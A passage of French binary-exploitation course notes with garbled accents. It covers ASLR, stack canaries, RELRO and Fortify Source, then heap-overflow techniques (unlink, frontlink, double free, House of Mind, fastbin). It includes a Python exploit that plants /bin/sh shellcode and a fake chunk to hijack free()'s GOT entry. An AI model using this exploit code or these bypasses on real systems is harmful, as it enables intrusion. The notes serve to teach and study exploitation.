Ils sont utiles pour la r√©cup√©ration d'erreur ou les interruptions.\
Cependant, d'apr√®s ce que j'ai lu, les autres registres ne sont pas prot√©g√©s, **donc si un `call ebx`, `call esi` ou `call edi`** se trouve √† l'int√©rieur de la fonction appel√©e, le contr√¥le peut √™tre pris. Ou vous pouvez √©galement modifier EBP pour modifier ESP.

**VTable et VPTR en C++**

Chaque classe a une **Vtable** qui est un tableau de **pointeurs vers des m√©thodes**.

Chaque objet d'une **classe** a un **VPtr** qui est un **pointeur** vers le tableau de sa classe. Le VPtr fait partie de l'en-t√™te de chaque objet, donc si une **modification** du **VPtr** est r√©alis√©e, il peut √™tre **modifi√©** pour **pointer** vers une m√©thode fictive, de sorte que l'ex√©cution d'une fonction aboutisse √† la shellcode.

## **Mesures pr√©ventives et √©vasions**

**ASLR pas si al√©atoire**

PaX divise l'espace d'adressage du processus en 3 groupes :

Code et donn√©es initialis√©es et non initialis√©es : .text, .data et .bss -> 16 bits d'entropie dans la variable delta\_exec, cette variable est initialis√©e de mani√®re al√©atoire √† chaque processus et est ajout√©e aux adresses initiales.

M√©moire allou√©e par mmap() et biblioth√®ques partag√©es -> 16 bits, delta\_mmap

La pile -> 24 bits, delta\_stack -> En r√©alit√© 11 (du 10√®me au 20√®me octet inclus) -> align√© sur 16 octets -> 524 288 adresses r√©elles possibles de la pile

Les variables d'environnement et les arguments se d√©placent moins qu'un tampon sur la pile.

**Return-into-printf**

C'est une technique pour transformer un d√©passement de tampon en une erreur de cha√Æne de format. Elle consiste √† remplacer l'EIP pour qu'il pointe vers un printf de la fonction et √† lui passer une cha√Æne de format manipul√©e pour obtenir des valeurs sur l'√©tat du processus.

**Attaque sur les biblioth√®ques**

Les biblioth√®ques sont situ√©es √† une position avec 16 bits d'al√©atoire = 65636 adresses possibles. Si un serveur vuln√©rable appelle fork(), l'espace d'adressage m√©moire est clon√© dans le processus enfant et reste intact. Il est donc possible d'essayer de forcer la fonction usleep() de libc en lui passant l'argument "16", de sorte que lorsqu'elle met plus de temps que d'habitude √† r√©pondre, cette fonction est trouv√©e. En connaissant l'emplacement de cette fonction, on peut obtenir delta\_mmap et calculer les autres.

La seule fa√ßon d'√™tre s√ªr que l'ASLR fonctionne est d'utiliser une architecture 64 bits. Il n'y a pas d'attaques par force brute dans ce cas.

**StackGuard et StackShield**

**StackGuard** ins√®re avant l'EIP -> 0x000aff0d(null, \n, EndOfFile(EOF), \r) -> recv(), memcpy(), read(), bcoy() restent vuln√©rables et il ne prot√®ge pas l'EBP.

**StackShield** est plus √©labor√© que StackGuard.

Il enregistre dans une table (Global Return Stack) toutes les adresses EIP de retour afin que le d√©passement de tampon ne cause aucun dommage. De plus, les deux adresses peuvent √™tre compar√©es pour v√©rifier s'il y a eu un d√©passement.

Il est √©galement possible de v√©rifier l'adresse de retour avec une valeur limite, donc si l'EIP va √† un endroit diff√©rent de celui habituel comme l'espace de donn√©es, cela sera d√©tect√©. Mais cela peut √™tre contourn√© avec Ret-to-lib, ROPs ou ret2ret.

Comme vous pouvez le voir, StackShield ne prot√®ge pas non plus les variables locales.

**Stack Smash Protector (ProPolice) -fstack-protector**

Le canary est plac√© avant l'EBP. Les variables locales sont r√©organis√©es de sorte que les tampons soient aux positions les plus √©lev√©es et ne puissent donc pas √©craser d'autres variables.

De plus, une copie s√©curis√©e des arguments pass√©s est r√©alis√©e au-dessus de la pile (au-dessus des variables locales) et ces copies sont utilis√©es comme arguments.

Il ne peut pas prot√©ger les tableaux de moins de 8 √©l√©ments ni les tampons faisant partie d'une structure utilisateur.

Le canary est un nombre al√©atoire extrait de "/dev/urandom" ou sinon il est 0xff0a0000. Il est stock√© dans TLS (Thread Local Storage). Les threads partagent le m√™me espace m√©moire, le TLS est une zone qui contient des variables globales ou statiques pour chaque thread. Cependant, en principe, elles sont copi√©es du processus parent, bien que le processus enfant puisse modifier ces donn√©es sans modifier celles du parent ni celles des autres enfants. Le probl√®me est que si fork() est utilis√© mais qu'aucun nouveau canary n'est cr√©√©, tous les processus (parent et enfants) utilisent le m√™me canary. Sur i386, il est stock√© dans gs:0x14 et sur x86\_64, il est stock√© dans fs:0x28.

Cette protection localise les fonctions qui ont des tampons pouvant √™tre attaqu√©s et inclut du code au d√©but de la fonction pour placer le canary et du code √† la fin pour le v√©rifier.
La fonction fork() cr√©e une copie exacte du processus parent, c'est pourquoi si un serveur web appelle fork(), une attaque de force brute byte par byte peut √™tre effectu√©e jusqu'√† ce que le canary utilis√© soit d√©couvert.

Si la fonction execve() est utilis√©e apr√®s fork(), l'espace est √©cras√© et l'attaque n'est plus possible. vfork() permet d'ex√©cuter le processus enfant sans cr√©er de duplication jusqu'√† ce que le processus enfant tente d'√©crire, alors une duplication est cr√©√©e.

**Relocation Read-Only (RELRO)**

### Relro

**Relro (Relocalisation en lecture seule)** affecte les autorisations de m√©moire de mani√®re similaire √† NX. La diff√©rence est que, tandis que NX rend la pile ex√©cutable, RELRO rend **certaines choses en lecture seule** afin que nous ne puissions pas y √©crire. La fa√ßon la plus courante dont j'ai vu cela √™tre un obstacle est de nous emp√™cher de faire une **surcharge de la table `got`**, ce qui sera expliqu√© plus tard. La table `got` contient les adresses des fonctions libc afin que le binaire sache quelles sont les adresses et puisse les appeler. Voyons √† quoi ressemblent les autorisations de m√©moire pour une entr√©e de la table `got` pour un binaire avec et sans relro.

Avec relro :
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sans relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Pour le binaire **sans relro**, nous pouvons voir que l'adresse d'entr√©e `got` pour `fgets` est `0x404018`. En examinant les mappages de m√©moire, nous constatons qu'elle se situe entre `0x404000` et `0x405000`, ce qui signifie qu'elle a les **permissions `rw`**, ce qui signifie que nous pouvons lire et √©crire dedans. Pour le binaire **avec relro**, nous constatons que l'adresse de la table `got` pour l'ex√©cution du binaire (pie est activ√©, donc cette adresse changera) est `0x555555557fd0`. Dans la table de mappage m√©moire de ce binaire, elle se situe entre `0x0000555555557000` et `0x0000555555558000`, ce qui signifie que nous ne pouvons que la lire.

Alors quelle est la **contournement** ? Le contournement typique que j'utilise est simplement de ne pas √©crire dans les r√©gions de m√©moire que relro rend en lecture seule, et de **trouver un autre moyen d'ex√©cuter du code**.

Notez que pour que cela se produise, le binaire doit conna√Ætre avant l'ex√©cution les adresses des fonctions :

* Liaison tardive : L'adresse d'une fonction est recherch√©e la premi√®re fois que la fonction est appel√©e. Ainsi, la GOT doit avoir des permissions d'√©criture pendant l'ex√©cution.
* Liaison imm√©diate : Les adresses des fonctions sont r√©solues au d√©but de l'ex√©cution, puis des permissions en lecture seule sont accord√©es aux sections sensibles telles que .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Pour v√©rifier si un programme utilise la liaison imm√©diate, vous pouvez ex√©cuter la commande suivante :
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Lorsque le binaire est charg√© en m√©moire et qu'une fonction est appel√©e pour la premi√®re fois, il saute vers la PLT (Procedure Linkage Table), √† partir de l√†, il effectue un saut (jmp) vers la GOT et d√©couvre que cette entr√©e n'a pas √©t√© r√©solue (elle contient une adresse suivante de la PLT). Il invoque alors le Runtime Linker ou rtfd pour r√©soudre l'adresse et la stocker dans la GOT.

Lorsqu'une fonction est appel√©e, elle est appel√©e via la PLT, qui contient l'adresse de la GOT o√π l'adresse de la fonction est stock√©e, redirigeant ainsi le flux vers cette adresse et appelant la fonction. Cependant, si c'est la premi√®re fois que la fonction est appel√©e, ce qui se trouve dans la GOT est l'instruction suivante de la PLT, donc le flux suit le code de la PLT (rtfd) et trouve l'adresse de la fonction, la stocke dans la GOT et l'appelle.

Lors du chargement d'un binaire en m√©moire, le compilateur lui indique √† quel d√©calage il doit placer les donn√©es qui doivent √™tre charg√©es lors de l'ex√©cution du programme.

Lazy binding -> L'adresse de la fonction est recherch√©e la premi√®re fois qu'elle est appel√©e, donc la GOT a des autorisations d'√©criture pour que lorsqu'elle est recherch√©e, elle soit stock√©e l√† et qu'il ne soit pas n√©cessaire de la rechercher √† nouveau.

Bind now -> Les adresses des fonctions sont recherch√©es lors du chargement du programme et les autorisations des sections .got, .dtors, .ctors, .dynamic, .jcr sont modifi√©es en lecture seule. **-z relro** et **-z now**

Malgr√© cela, en g√©n√©ral, les programmes ne sont pas compliqu√©s avec ces options, donc ces attaques restent possibles.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** -> Pour savoir s'ils utilisent le BIND NOW

**Fortify Source -D_FORTIFY_SOURCE=1 ou =2**

Il essaie d'identifier les fonctions qui copient de mani√®re non s√©curis√©e d'un endroit √† un autre et remplace la fonction par une fonction s√©curis√©e.

Par exemple :\
char buf[16];\
strcpy(buf, source);

Il l'identifie comme non s√©curis√©, puis remplace strcpy() par \_\_strcpy\_chk() en utilisant la taille du tampon comme taille maximale √† copier.

La diff√©rence entre **=1** et **=2** est que :

La deuxi√®me option n'autorise pas que **%n** provienne d'une section avec des autorisations d'√©criture. De plus, le param√®tre pour l'acc√®s direct aux arguments ne peut √™tre utilis√© que si les pr√©c√©dents ont √©t√© utilis√©s, c'est-√†-dire que **%3$d** ne peut √™tre utilis√© que si **%2$d** et **%1$d** ont √©t√© utilis√©s auparavant.

Pour afficher le message d'erreur, on utilise argv[0], donc si on y met l'adresse d'un autre emplacement (comme une variable globale), le message d'erreur affichera le contenu de cette variable. Page 191

**Remplacement de Libsafe**

Il est activ√© avec : LD_PRELOAD=/lib/libsafe.so.2\
ou\
"/lib/libsave.so.2" > /etc/ld.so.preload

Il intercepte les appels √† certaines fonctions non s√©curis√©es par d'autres s√©curis√©es. Ce n'est pas normalis√©. (uniquement pour x86, pas pour les compilations avec -fomit-frame-pointer, pas de compilations statiques, toutes les fonctions vuln√©rables ne deviennent pas s√©curis√©es et LD_PRELOAD ne fonctionne pas avec les binaires suid).

**ASCII Armored Address Space**

Consiste √† charger les biblioth√®ques partag√©es de 0x00000000 √† 0x00ffffff afin qu'il y ait toujours un octet 0x00. Cependant, cela ne prot√®ge pratiquement pas contre les attaques, surtout en little endian.

**ret2plt**

Consiste √† effectuer un ROP de mani√®re √† appeler la fonction strcpy@plt (de la plt) et √† pointer vers l'entr√©e de la GOT et √† copier le premier octet de la fonction √† appeler (system()). Ensuite, on fait la m√™me chose en pointant vers GOT+1 et en copiant le deuxi√®me octet de system()... Enfin, on appelle l'adresse stock√©e dans la GOT qui sera system()

**Faux EBP**

Pour les fonctions qui utilisent EBP comme registre pour pointer vers les arguments, en modifiant EIP et en pointant vers system(), EBP doit √©galement √™tre modifi√© pour pointer vers une zone m√©moire contenant 2 octets quelconques, puis l'adresse de &"/bin/sh".

**Cages avec chroot()**

debootstrap -arch=i386 hardy /home/user -> Installe un syst√®me de base dans un sous-r√©pertoire sp√©cifique

Un administrateur peut sortir de l'une de ces cages en faisant : mkdir foo; chroot foo; cd ..

**Instrumentation de code**

Valgrind -> Recherche d'erreurs\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 D√©bordements de tas : Exploits basiques**

**Chunk allou√©**

prev_size |\
size | - En-t√™te\
*mem | Donn√©es

**Chunk libre**

prev_size |\
size |\
*fd | Ptr vers le chunk suivant\
*bk | Ptr vers le chunk pr√©c√©dent - En-t√™te\
*mem | Donn√©es

Les chunks libres sont dans une liste doublement cha√Æn√©e (bin) et il ne peut jamais y avoir deux chunks libres cons√©cutifs (ils sont fusionn√©s).

Dans "size", il y a des bits pour indiquer : si le chunk pr√©c√©dent est utilis√©, si le chunk a √©t√© allou√© via mmap() et si le chunk appartient √† l'arena principale.

Lorsqu'un chunk est lib√©r√© et que certains des chunks adjacents sont libres, ils sont fusionn√©s √† l'aide de la macro unlink() et le nouveau chunk le plus grand est pass√© √† frontlink() pour qu'il soit ins√©r√© dans le bon bin.

unlink(){\
BK = P->bk; -> Le BK du nouveau chunk est celui qui √©tait d√©j√† libre avant\
FD = P->fd; -> Le FD du nouveau chunk est celui qui √©tait d√©j√† libre avant\
FD->bk = BK; -> Le BK du chunk suivant pointe vers le nouveau chunk\
BK->fd = FD; -> Le FD du chunk pr√©c√©dent pointe vers le nouveau chunk\
}

Par cons√©quent, si nous parvenons √† modifier P->bk avec l'adresse d'un shellcode et P->fd avec l'adresse d'une entr√©e dans la GOT ou DTORS moins 12, nous obtenons :

BK = P->bk = &shellcode\
FD = P->fd = &__dtor_end__ - 12\
FD->bk = BK -> *((&__dtor_end__ - 12) + 12) = &shellcode

Ainsi, lorsque le programme se termine, le shellcode est ex√©cut√©.

De plus, la 4√®me instruction de unlink() √©crit quelque chose et le shellcode doit √™tre r√©par√© pour cela :

BK->fd = FD -> *((&shellcode + 8) = (&__dtor_end__ - 12) -> Cela provoque l'√©criture de 4 octets √† partir du 8√®me octet du shellcode, donc la premi√®re instruction du shellcode doit √™tre un jmp pour sauter cela et atteindre des nops qui m√®nent au reste du shellcode.

Par cons√©quent, l'exploit est cr√©√© :

Dans le buffer1, nous ins√©rons le shellcode en commen√ßant par un jmp pour qu'il atteigne les nops ou le reste du shellcode.
Apr√®s le shell code, nous remplissons avec des donn√©es jusqu'√† atteindre les champs prev\_size et size du chunk suivant. Nous mettons 0xfffffff0 √† ces emplacements (pour √©craser prev\_size et indiquer qu'il est libre) et "-4" (0xfffffffc) dans size (pour que lorsque le troisi√®me chunk v√©rifie si le deuxi√®me est libre, il acc√®de en r√©alit√© √† prev\_size modifi√© qui lui indique qu'il est libre) -> Ainsi, lorsque free() est appel√©, il acc√®de √† size du troisi√®me chunk mais en r√©alit√© il acc√®de √† size du deuxi√®me moins 4 et pense que le deuxi√®me chunk est libre. Et ensuite, il appelle **unlink()**.

Lorsque unlink() est appel√©, il utilise les premi√®res donn√©es du deuxi√®me chunk comme P->fd, donc l'adresse que nous voulons √©craser est ins√©r√©e l√†-bas moins 12 (car il ajoute 12 √† l'adresse stock√©e dans FD pour BK). Et √† cette adresse, nous ins√©rons la deuxi√®me adresse trouv√©e dans le deuxi√®me chunk, qui sera l'adresse du shell code (P->bk faux).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 octets de remplissage**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Il est important que le bit indiquant que le chunk pr√©c√©dent est libre soit √† 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, pour que le "size" du troisi√®me chunk soit 4 octets en arri√®re (il pointe vers prev\_size) car c'est l√† qu'il v√©rifie si le deuxi√®me chunk est libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Dans la charge utile, nous ajoutons 8 octets de remplissage au d√©but**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresse de free() dans la plt-12 (ce sera l'adresse √©cras√©e pour ex√©cuter le shell code la deuxi√®me fois que free() est appel√©)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Comme mentionn√© pr√©c√©demment, la charge utile commence par 8 octets de remplissage pour aucune raison particuli√®re**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Le deuxi√®me chunk est modifi√©, got\_free pointe vers l'endroit o√π nous allons stocker l'adresse addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() en lib√©rant dans l'ordre inverse (wargame)**

Nous contr√¥lons 3 chunks cons√©cutifs et ils sont lib√©r√©s dans l'ordre inverse de leur r√©servation.

Dans ce cas :

Dans le chunk c, nous pla√ßons le shell code.

Nous utilisons le chunk a pour √©craser le b de sorte que le size ait le bit PREV\_INUSE d√©sactiv√©, ce qui fait penser que le chunk a est libre.

De plus, nous √©crasons le size dans l'en-t√™te b pour qu'il soit √©gal √† -4.

Ainsi, le programme pensera que "a" est libre et dans un bin, il appellera donc unlink() pour le d√©sencha√Æner. Cependant, comme l'en-t√™te PREV\_SIZE vaut -4, il pensera que le chunk "a" commence r√©ellement √† b+4. Autrement dit, il effectuera unlink() sur un chunk qui commence √† b+4, donc √† b+12 se trouvera le pointeur "fd" et √† b+16 se trouvera le pointeur "bk".

De cette mani√®re, si nous mettons l'adresse du shell code dans bk et l'adresse de la fonction "puts()" - 12 dans fd, nous avons notre payload.

**Technique de Frontlink**

Frontlink est appel√© lorsque quelque chose est lib√©r√© et aucun de ses chunks adjacents n'est libre, unlink() n'est pas appel√© mais frontlink() est appel√© directement.

Vuln√©rabilit√© utile lorsque le malloc attaqu√© n'est jamais lib√©r√© (free()).

Il n√©cessite :

Un tampon qui peut √™tre d√©bord√© avec la fonction de saisie de donn√©es.

Un tampon contigu √† celui-ci qui doit √™tre lib√©r√© et dont le champ fd de l'en-t√™te sera modifi√© gr√¢ce au d√©bordement du tampon pr√©c√©dent.

Un tampon √† lib√©rer avec une taille sup√©rieure √† 512 mais inf√©rieure au tampon pr√©c√©dent.

Un tampon d√©clar√© avant l'√©tape 3 qui permet de remplacer prev\_size de celui-ci.

De cette mani√®re, en √©crasant deux mallocs de mani√®re incontr√¥l√©e et un malloc de mani√®re contr√¥l√©e mais qui n'est lib√©r√© qu'une seule fois, nous pouvons r√©aliser une exploitation.

**Vuln√©rabilit√© double free()**

Si free() est appel√© deux fois avec le m√™me pointeur, deux bins pointent vers la m√™me adresse.

Si nous voulons r√©utiliser l'un d'eux, il sera assign√© sans probl√®me. Si nous voulons utiliser un autre, il sera assign√© au m√™me espace, de sorte que les pointeurs "fd" et "bk" seront falsifi√©s avec les donn√©es √©crites par l'allocation pr√©c√©dente.

**After free()**

Un pointeur pr√©c√©demment lib√©r√© est r√©utilis√© sans contr√¥le.

## **8 D√©bordements de tas : Exploits avanc√©s**

Les techniques Unlink() et FrontLink() ont √©t√© supprim√©es en modifiant la fonction unlink().

**The house of mind**

Une seule appel √† free() est n√©cessaire pour ex√©cuter du code arbitraire. Il est int√©ressant de trouver un deuxi√®me chunk qui peut √™tre d√©bord√© par un pr√©c√©dent et lib√©r√©.

Un appel √† free() appelle public\_fREe(mem), qui fait :

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Renvoie un pointeur vers l'adresse o√π commence le chunk (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

Dans \[1], il v√©rifie le champ size du bit NON\_MAIN\_ARENA, qui peut √™tre modifi√© pour que la v√©rification renvoie true et ex√©cute heap\_for\_ptr() qui effectue un and avec "mem", mettant les 2,5 octets les moins significatifs √† 0 (dans notre cas, de 0x0804a000 √† 0x08000000) et acc√®de √† 0x08000000->ar\_ptr (comme s'il s'agissait d'une structure heap\_info).
De cette fa√ßon, si nous pouvons contr√¥ler un morceau par exemple √† l'adresse 0x0804a000 et qu'un morceau va √™tre lib√©r√© √† l'adresse **0x081002a0**, nous pouvons atteindre l'adresse 0x08100000 et √©crire ce que nous voulons, par exemple **0x0804a000**. Lorsque ce deuxi√®me morceau sera lib√©r√©, heap\_for\_ptr(ptr)->ar\_ptr renverra ce que nous avons √©crit √† l'adresse 0x08100000 (car l'op√©ration "et" que nous avons vue pr√©c√©demment est appliqu√©e √† 0x081002a0 et √† partir de l√†, les 4 premiers octets, ar\_ptr, sont extraits).

De cette mani√®re, \_int\_free(ar\_ptr, mem) est appel√©, c'est-√†-dire **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Comme nous l'avons vu pr√©c√©demment, nous pouvons contr√¥ler la valeur de av, car c'est ce que nous √©crivons dans le morceau qui va √™tre lib√©r√©.

Comme unsorted\_chunks est d√©fini, nous savons que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Par cons√©quent, si nous √©crivons la valeur de \_\_DTOR\_END\_\_-12 dans av->bins\[2], √† la derni√®re instruction, l'adresse du deuxi√®me morceau sera √©crite dans \_\_DTOR\_END\_\_.

Cela signifie que dans le premier morceau, nous devons mettre plusieurs fois l'adresse de \_\_DTOR\_END\_\_-12 au d√©but, car av->bins\[2] la r√©cup√©rera √† partir de l√†.

Dans l'adresse o√π tombe l'adresse du deuxi√®me morceau avec les 5 derniers z√©ros, nous devons √©crire l'adresse de ce premier morceau pour que heap\_for\_ptr() pense que ar\_ptr est au d√©but du premier morceau et en extrait av->bins\[2].

Dans le deuxi√®me morceau et gr√¢ce au premier, nous √©crasons prev\_size avec un jump 0x0c et size avec quelque chose pour activer -> NON\_MAIN\_ARENA.

Ensuite, dans le deuxi√®me morceau, nous mettons beaucoup de nops et enfin la shellcode.

De cette fa√ßon, \_int\_free(CHUNK1, CHUNK2) sera appel√© et suivra les instructions pour √©crire l'adresse de prev\_size de CHUNK2 dans \_\_DTOR\_END\_\_, qui sautera ensuite vers la shellcode.

Pour appliquer cette technique, il faut que certaines conditions suppl√©mentaires soient remplies, ce qui complique un peu plus la charge utile.

Cette technique n'est plus applicable car elle a √©t√© presque enti√®rement corrig√©e, tout comme pour unlink. On v√©rifie si le nouvel emplacement pointe √©galement vers lui.

**Fastbin**

C'est une variante de The house of mind.

Nous voulons ex√©cuter le code suivant, qui est atteint apr√®s la premi√®re v√©rification de la fonction \_int\_free().

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

De cette fa√ßon, si nous mettons dans "fb" l'adresse d'une fonction dans la GOT, cette adresse sera remplac√©e par l'adresse du morceau falsifi√©. Pour cela, il est n√©cessaire que l'ar√®ne soit proche des adresses des dtors. Plus pr√©cis√©ment, av->max\_fast doit √™tre √† l'adresse que nous allons √©craser.

Comme nous l'avons vu avec The House of Mind, nous contr√¥lions la position de av.

Donc, si nous mettons une taille de 8 + NON\_MAIN\_ARENA + PREV\_INUSE dans le champ size, fastbin\_index() nous renverra fastbins\[-1\], qui pointera vers av->max\_fast.

Dans ce cas, av->max\_fast sera l'adresse qui sera √©cras√©e (pas celle vers laquelle elle pointe, mais cette position sera √©cras√©e).

De plus, il faut que le morceau contigu au morceau lib√©r√© soit plus grand que 8 -> Comme nous avons dit que la taille du morceau lib√©r√© est de 8, dans ce faux morceau, nous devons simplement mettre une taille sup√©rieure √† 8 (comme la shellcode sera √©galement dans le morceau lib√©r√©, nous devrons mettre un jmp au d√©but qui tombe sur les nops).

De plus, ce m√™me faux morceau doit √™tre inf√©rieur √† av->system\_mem. av->system\_mem est situ√© √† 1848 octets plus loin.

En raison des z√©ros de \_DTOR\_END\_ et des quelques adresses dans la GOT, aucune de ces adresses de ces sections ne peut √™tre √©cras√©e, donc voyons comment appliquer fastbin pour attaquer la pile.

Une autre forme d'attaque consiste √† rediriger **av** vers la pile.

Si nous modifions la taille pour qu'elle soit de 16 au lieu de 8, alors fastbin\_index() nous renverra fastbins\[0\] et nous pouvons l'utiliser pour √©craser la pile.

Pour cela, il ne doit y avoir aucun canary ni de valeurs √©tranges sur la pile, en fait nous devons nous trouver dans cette configuration : 4 octets nuls + EBP + RET.

Les 4 octets nuls sont n√©cessaires car **av** sera √† cette adresse et le premier √©l√©ment d'un **av** est le mutex qui doit valoir 0.

**av->max\_fast** sera EBP et sera une valeur qui nous permettra de contourner les restrictions.

Dans **av->fastbins\[0\]**, nous √©craserons avec l'adresse de **p** et ce sera RET, ainsi il sautera vers la shellcode.

De plus, dans **av->system\_mem** (1484 octets au-dessus de la position sur la pile), il y aura beaucoup de d√©chets qui nous permettront de contourner la v√©rification effectu√©e.

De plus, il faut que le morceau contigu au morceau lib√©r√© soit plus grand que 8 -> Comme nous avons dit que la taille du morceau lib√©r√© est de 16, dans ce faux morceau, nous devons simplement mettre une taille sup√©rieure √† 8 (comme la shellcode sera √©galement dans le morceau lib√©r√©, nous devrons mettre un jmp au d√©but qui tombe sur les nops qui se trouvent apr√®s le champ size du nouveau faux morceau).

**The House of Spirit**

